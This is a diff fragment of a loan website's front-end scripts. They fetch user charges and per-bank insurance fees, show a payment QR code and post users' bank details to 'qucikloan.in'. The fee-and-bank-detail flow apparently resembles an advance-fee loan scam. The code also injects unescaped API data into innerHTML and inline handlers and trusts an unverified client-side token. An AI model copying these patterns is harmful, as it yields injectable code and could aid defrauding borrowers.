+            throw new Error('Invalid token');
+        }
+    
+        const payload = parts[1];
+        const decodedPayload = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
+        return JSON.parse(decodedPayload);
+    }
+    
+    // Fetch Functions
+    async function fetchUserDetails(userId) {
+        try {
+            const response = await fetch(`https://qucikloan.in/back/FetchPersonalUserdetailsecondPage/${userId}`);
+            const data = await response.json();
+    
+            if (response.ok) {
+                // console.log(data,"1112")
+                updateUserUI(data);
+                updateLoanSummary(data);
+            } else {
+                console.error('Failed to fetch user details:', data.message || 'Unknown error');
+            }
+        } catch (error) {
+            console.error('Error fetching user details:', error);
+        }
+    }
+    
+ 
+    let hasModalBeenShown = false; // Flag to track if the modal has been shown
+
+async function fetchData(userId) {
+try {
+    const response = await fetch(`https://qucikloan.in/back/checkStatatcurity/${userId}`);
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+
+    const data = await response.json();
+
+    // Show the modal only if Status is true and the modal hasn't been shown yet
+    if (data.StatusSec == 1 && !hasModalBeenShown) {
+        // console.log("hiih ander")
+        showModal();
+        hasModalBeenShown = true; // Set the flag to true after showing the modal
+    }
+    if(data.StatusPro==0)
+    {
+        window.location.href = '/Download';
+    }
+} catch (error) {
+    console.error('Error fetching data:', error);
+    // updateStatusIcon(false);
+}
+}
+
+function showModal() {
+const modal = document.getElementById('statusModal2');
+const closeButton = document.querySelector('.close-button');
+const confirmButton = document.getElementById('okay');
+
+// Show the modal
+modal.style.display = 'block';
+
+// Close the modal when the close button is clicked
+confirmButton.onclick = function() {
+modal.style.display = 'none';
+window.location.href = '/finaldownloadpage';
+}
+
+closeButton.onclick = function() {
+    modal.style.display = 'none';
+    window.location.href = '/finaldownloadpage';
+};
+
+window.onclick = function(event) {
+    if (event.target === modal) {
+        modal.style.display = 'none';
+    }
+};
+}
+
+    
+    // UI Update Functions
+    function updateUserUI(data) {
+        // document.getElementById('walletad').textContent =  `${data.charges1} INR` || 'null';
+        document.getElementById('walletaddd').textContent= `${data.charges2} INR` || 'null';
+        document.getElementById('nameUser').textContent = data.Username || 'Joy';
+        document.getElementById('walletadd').textContent = data.charges1+data.loanTypeDetails.limit || 'null';
+        document.getElementById('limitamt').textContent=data.loanTypeDetails.limit || 'null'
+        document.getElementById('proceessingamt').textContent=data.charges1 || 'null'
+        document.getElementById('totalamt').textContent=data.charges1+data.loanTypeDetails.limit || 'null';
+        if(data.limit)
+    {
+        document.getElementById('loan').textContent = `${data.limit || '0'}`;
+    }
+    else
+    {
+        document.getElementById('loan').textContent = `${data.loanTypeDetails?.limit || '0'}`;
+    }
+    }
+    
+    function updateLoanSummary(data) {
+
+        console.log(data,"1211")
+    }
+    
+    function updateCompanyProfileUI(companyData) {
+      
+        const scannerImage = document.getElementById('scannerImage');
+        document.getElementById('contact-phone').innerHTML = `<i class="fas fa-phone"></i> ${companyData.contactNo}`;
+    document.getElementById('contact-email').innerHTML = `<i class="fas fa-envelope"></i> ${companyData.email}`;
+    document.getElementById('contact-address').innerHTML = `<i class="fas fa-home"></i> ${companyData.address}`;
+    document.getElementById('footer-email').textContent = companyData.email;
+    document.getElementById('footer-email').href = `mailto:${companyData.email}`;
+     
+        if (scannerImage) {
+            scannerImage.src = companyData.paymentQRCharges2 ? `${companyData.paymentQRCharges2}` : '/assets/img/scanner.png';
+        }
+          }
+// Function to update insurance data from API and handle default bank
+function updateInsurance(insuranceData) {
+    const container = document.getElementById('insuranceContainer');
+    const bankAmountSpans = document.querySelectorAll('.bankAmount');
+    container.innerHTML = ''; // Clear the container before adding new data
+
+    // Iterate over the insurance data and render each bank
+    insuranceData.forEach((item, index) => {
+        const { banktype, insuranceamount, image } = item;
+
+        // Add the `active-bank` class to the first bank by default
+        const activeClass = index === 0 ? 'active-bank' : '';
+
+        const insuranceHtml = `
+          <div class="col-md-4 ${activeClass}" onclick="handleBankClick('${banktype}', '${insuranceamount}', ${index})">
+            <div class="insurance-card">
+              <div class="insurance-img">
+                <img src="${image}" alt="${banktype}" />
+              </div>
+              <div class="insurance-details">
+                <p class="bank-type">${banktype}</p>
+                <p class="insurance-amount">${insuranceamount} INR</p>
+              </div>
+            </div>
+          </div>
+        `;
+
+        container.insertAdjacentHTML('beforeend', insuranceHtml);
+
+        // Show the insurance amount for the first bank by default
+        if (index === 0) {
+            // Update all bankAmount spans to show the default insurance amount
+            bankAmountSpans.forEach(span => {
+                span.innerText = `${insuranceamount} INR`;
+            });
+        }
+    });
+}
+function updateInsurance(insuranceData) {
+    const container = document.getElementById('insuranceContainer');
+    const bankAmountSpans = document.querySelectorAll('.bankAmount');
+    container.innerHTML = ''; // Clear the container before adding new data
+
+    // Iterate over the insurance data and render each bank
+    insuranceData.forEach((item, index) => {
+        const { banktype, insuranceamount, image } = item;
+
+        // Add the `active-bank` class to the first bank by default
+        const activeClass = index === 0 ? 'active-bank' : '';
+
+        const insuranceHtml = `
+          <div class="col-md-4 ${activeClass}" onclick="handleBankClick('${banktype}', '${insuranceamount}', ${index})">
+            <div class="insurance-card">
+              <div class="insurance-img">
+                <img src="${image}" alt="${banktype}" />
+              </div>
+              <div class="insurance-details">
+                <p class="bank-type">${banktype}</p>
+                <p class="insurance-amount">${insuranceamount} INR</p>
+              </div>
+            </div>
+          </div>
+        `;
+
+        container.insertAdjacentHTML('beforeend', insuranceHtml);
+
+        // Show the insurance amount for the first bank by default
+        if (index === 0) {
+            // Update all bankAmount spans to show the default insurance amount
+            bankAmountSpans.forEach(span => {
+                span.innerText = `${insuranceamount} INR`;
+            });
+        }
+    });
+}
+
+// Handle bank click event to update the active bank and insurance amount
+function handleBankClick(banktype, insuranceamount, index) {
+    // Update the insurance amount in all elements with the class `bankAmount`
+    document.querySelectorAll('.bankAmount').forEach(span => {
+        span.innerText = `${insuranceamount} INR`;
+    });
+
+    // Remove the active class from all bank elements
+    document.querySelectorAll('.col-md-4').forEach((el) => el.classList.remove('active-bank'));
+
+    // Add the active class to the clicked bank
+    document.querySelectorAll('.col-md-4')[index].classList.add('active-bank');
+
+    // Optionally, you can also open a modal or display more details on bank click
+    openPopup(banktype, insuranceamount); // Opens a modal or popup with bank details
+}
+
+   
+    document.addEventListener('DOMContentLoaded', () => {
+        const token = localStorage.getItem('tokenData');
+        if (!token) {
+             window.location.href="/"
+        }
+    
+        const tokenData = decodeJWT(token);
+        const userId = tokenData.user.id;
+        console.log("User ID:", userId);
+    
+        fetchData(userId);
+        fetchUserDetails(userId);
+    
+        setInterval(() => fetchData(userId), 3000);
+    
+        const downloadButton = document.getElementById('downloadButton');
+        if (downloadButton) {
+            downloadButton.addEventListener('click', downloadPDF);
+        }
+    });
+    
+</script> 
+<script>
+// Get modal element
+var modal = document.getElementById('myModal');
+var loanAmountContainer = document.getElementById('loanAmountContainer');
+var span = document.getElementsByClassName('close')[0];
+
+// When the user clicks on the loan amount container, open the modal
+loanAmountContainer.onclick = function() {
+    modal.style.display = 'block';
+}
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+    modal.style.display = 'none';
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = 'none';
+    }
+}
+document.getElementById("logoutBtn").addEventListener("click", function() {
+// Trigger the logout route
+window.location.href = "/logout";
+});
+
+async function fetchLoanType() {
+try {
+    const response = await fetch('https://qucikloan.in/back/fetchCompanyProfile');
+    if (!response.ok) {
+        throw new Error('Network response was not ok');
+    }
+    const data = await response.json();
+    updateCompanyProfileUI(data.data);
+    console.log(data,"data.InsuranceDatadata.InsuranceData")
+    updateInsurance(data.InsuranceData);
+    
+} catch (error) {
+    console.error('Error fetching loan types:', error);
+}
+}
+
+// Function to update the footer with company profile information
+
+// Initialize on DOMContentLoaded
+document.addEventListener('DOMContentLoaded', () => {
+  fetchLoanType();
+});
+
+// Function to open the popup and populate form fields
+function openPopup(banktype, insuranceamount) {
+    // Fill the form with dynamic data if needed
+    document.getElementById('bankName').value = banktype;  // Set bank name
+    document.getElementById('insuranceamount').value = insuranceamount;  // Set insurance amount
+
+    // Show the modal
+    document.getElementById('bankDetailsPopup').style.display = 'block';
+}
+
+// Function to close the popup
+function closePopup() {
+    document.getElementById('bankDetailsPopup').style.display = 'none';
+}
+
+// Function to decode JWT and get user data
+function decodeJWT(token) {
+    const base64Payload = token.split('.')[1];
+    const jsonPayload = decodeURIComponent(atob(base64Payload).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+    return JSON.parse(jsonPayload);
+}
+
+// Function to handle form submission
+function submitForms() {
+    // Get the token and decode it
+    const token = localStorage.getItem('tokenData');
+    if (!token) {
+        window.location.href = "/";
+        return;
+    }
+
+    const tokenData = decodeJWT(token);
+    const userId = tokenData.user.id;
+
+    // Gather form data
+    const form = document.getElementById('bankForm');
+    const formData = new FormData(form);
+
+    // Convert FormData to an object and include userId
+    const data = {};
+    formData.forEach((value, key) => {
+        data[key] = value;
+    });
+    data.userId = userId;
+    console.log(data, "data");
+
+    // Send data to the API
+    fetch('https://qucikloan.in/back/bankdetails', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(response => response.json())
+    .then(result => {
+        console.log('Success:', result);
+        
+        // Clear the form fields
+        form.reset();
+
+        // Close the popup after successful submission
+        closePopup();
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+
+</script>
+
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.2/html2pdf.bundle.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+
+</body>
+</html>
+
